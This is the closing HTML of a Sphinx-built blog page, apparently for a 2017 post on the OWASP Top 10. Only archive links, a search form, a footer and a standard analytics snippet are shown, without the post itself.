    <li><a href="../../blog/2019/">2019 (8)</a></li>
    
  
    
    <li><a href="../../blog/2018/">2018 (11)</a></li>
    
  
    
    <li><a href="../../blog/2017/">2017 (34)</a></li>
    
  
  </ul>

<div id="searchbox" style="display: none" role="search">
  <h3 id="searchlabel">Quick search</h3>
    <div class="searchformwrapper">
    <form class="search" action="../../search/" method="get">
      <input type="text" name="q" aria-labelledby="searchlabel" />
      <input type="submit" value="Go" />
    </form>
    </div>
</div>
<script type="text/javascript">$('#searchbox').show(0);</script>
        </div>
      </div>
      <div class="clearer"></div>
    </div>
    <div class="footer">
      &copy;2017, binwei.
      
      |
      Powered by <a href="http://sphinx-doc.org/">Sphinx 2.1.2</a>
      &amp; <a href="https://github.com/bitprophet/alabaster">Alabaster 0.7.12</a>
      
      |
      <a href="../../_sources/2017/security_owasp_top_10.rst.txt"
          rel="nofollow">Page source</a>
    </div>

    

    
    <script type="text/javascript">

      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-97414429-1']);
      _gaq.push(['_setDomainName', 'none']);
      _gaq.push(['_setAllowLinker', true]);
      _gaq.push(['_trackPageview']);

      (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
      })();

    </script>
    
  </body>
</html>